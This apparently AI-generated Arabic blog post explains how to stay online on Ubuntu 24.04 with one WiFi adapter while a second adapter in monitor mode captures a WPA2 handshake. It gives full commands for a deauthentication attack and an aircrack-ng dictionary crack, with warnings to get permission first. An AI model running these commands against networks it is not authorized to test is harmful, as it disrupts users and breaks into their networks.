---
audio: false
generated: true
image: false
lang: ar
layout: post
model: x-ai/grok-4-fast
title: محولات الواي فاي المزدوجة لاختبار الأمان
translated: true
type: note
---

نعم، يمكن لأوبونتو 24.04 الاتصال بشبكة لاسلكية واحدة باستخدام كلمة مرور معروفة (للاتصال بالإنترنت) بينما يحاول في الوقت نفسه "اختراق" (على سبيل المثال، كسر أو اختبار) كلمة مرور شبكة لاسلكية أخرى، لكن هذا يتطلب أجهزة محددة وتهيئة دقيقة لتجنب التعارضات. هذا الإعداد شائع لاختبارات الاختراق الأخلاقية أو التدقيق الأمني على شبكاتك الخاصة—لاحظ أن الوصول غير المصرح به غير قانوني.

### المتطلبات الأساسية
- **محولان لاسلكيان**: تحتاج إلى واجهتين لاسلكيتين منفصلتين على الأقل (مثل WiFi المدمج في الكمبيوتر المحمول كـ `wlan0` للاتصال، ومحول USB لاسلكي كـ `wlan1` للمراقبة). لا يمكن لواجهة واحدة أن تكون متصلة (وضع الإدارة Managed Mode) وفي وضع المراقبة Monitor Mode في نفس الوقت.
  - المحولات الموصى بها لوضع المراقبة: Intel (مثل AX200/AX210)، أو Atheros، أو رقاقات Realtek المتوافقة. تحقق من التوافق باستخدام `iw list` (ابحث عن "monitor" تحت أوضاع الواجهة المدعومة).
- **الأدوات**: قم بتثبيت حزمة `aircrack-ng` للمسح، والتقاط مصافحات الاتصال، والاختراق:
  ```
  sudo apt update && sudo apt install aircrack-ng
  ```
- **تفاصيل أوبونتو 24.04**: لا توجد تغييرات كبيرة عن الإصدارات السابقة—يدير NetworkManager الاتصالات، ولكن يمكن لأدوات وضع المراقبة أن تتداخل إذا لم تتم إدارتها بشكل صحيح. النواة 6.8+ تدعم المحولات الحديثة بشكل جيد.

### آلية العمل: إعداد خطوة بخطوة
1. **الاتصال بالشبكة اللاسلكية المعروفة (وضع الإدارة Managed Mode)**:
   - استخدم NetworkManager (واجهة رسومية أو سطر أوامر) للاتصال بشكل طبيعي:
     ```
     nmcli device wifi connect "YourKnownSSID" password "knownpassword"
     ```
   - التحقق: `nmcli connection show --active`. هذا يحافظ على اتصال الإنترنت نشطًا على الواجهة الأولى (مثل `wlan0`).

2. **إعداد المحول الثاني للمراقبة (دون تعطيل الأول)**:
   - تحديد الواجهات: `iw dev` (مثل `wlan1` وهو محول USB الخاص بك).
   - تجنب `airmon-ng` (من aircrack-ng)، لأنه غالبًا ما يوقف NetworkManager ويعطل الاتصالات. بدلاً من ذلك، استخدم أوامر `iw` يدويًا:
     ```
     sudo ip link set wlan1 down
     sudo iw dev wlan1 set type monitor
     sudo ip link set wlan1 up
     ```
   - التحقق: `iw dev` (يجب أن يظهر `type monitor` لـ `wlan1`).

3. **مسح الشبكات والتقاط الحزم لاختراق كلمة المرور**:
   - مسح الشبكات: `sudo airodump-ng wlan1` (يعرض SSIDs، و BSSIDs، والقنوات؛ اضغط Ctrl+C للإيقاف).
   - استهداف شبكة محددة (مثل BSSID `AA:BB:CC:DD:EE:FF` على القناة 6):
     ```
     sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 -w capture wlan1
     ```
     هذا يلتقط الحزم إلى `capture-01.cap`. لاختراق WPA2، انتظر مصافحة الاتصال الرباعية (أو أجبرها أخلاقيًا باستخدام deauth: `sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan1`).
   - الاختراق بلا اتصال: `sudo aircrack-ng -w /path/to/wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap`.

4. **استعادة العمل الطبيعي**:
   - إيقاف المراقبة:
     ```
     sudo ip link set wlan1 down
     sudo iw dev wlan1 set type managed
     sudo ip link set wlan1 up
     ```
   - أعد الاتصال إذا لزم الأمر: أعد تشغيل NetworkManager (`sudo systemctl restart NetworkManager`) أو استخدم `nmcli`.

### المشكلات المحتملة والإصلاحات
- **انقطاع الاتصال**: إذا انقطع اتصال WiFi الأول (نادر مع الطريقة اليدوية)، جدد DHCP: `sudo dhclient -r wlan0 && sudo dhclient wlan0`.
- **التداخل**: أوقف العمليات المتعارضة فقط على واجهة المراقبة: `sudo airmon-ng check kill` (لكن هذا يؤثر على الكل—استخدم بحذر).
- **استقرار محول USB**: بعض المحولات الرخيصة تنقطع في وضع المراقبة؛ اختبر باستخدام `iwconfig` أو `iw dev`.
- **بديل سلكي**: إذا لم يكن هناك WiFi ثانٍ، استخدم Ethernet للإنترنت وقم بالمراقبة على محول WiFi واحد (أسهل، لأن إيقاف NetworkManager لن يؤثر على السلكي).

يعمل هذا الإعداد بشكل موثوق على أوبونتو 24.04 لأغراض الاختبار. احصل دائمًا على الإذن قبل اختبار الشبكات.

### المراجع
- [How to enable WiFi while using two wireless cards one in monitor mode](https://security.stackexchange.com/questions/121215/how-to-enable-wifi-while-using-two-wireless-cards-one-in-monitor-mode-and-other)
- [Wireless Packet Capture using Ubuntu 24 LTS](https://www.reddit.com/r/RGNets/comments/1l4672v/wireless_packet_capture_using_ubuntu_24_lts/)
- [Aircrack-ng Newbie Guide](https://www.aircrack-ng.org/doku.php?id=newbie_guide)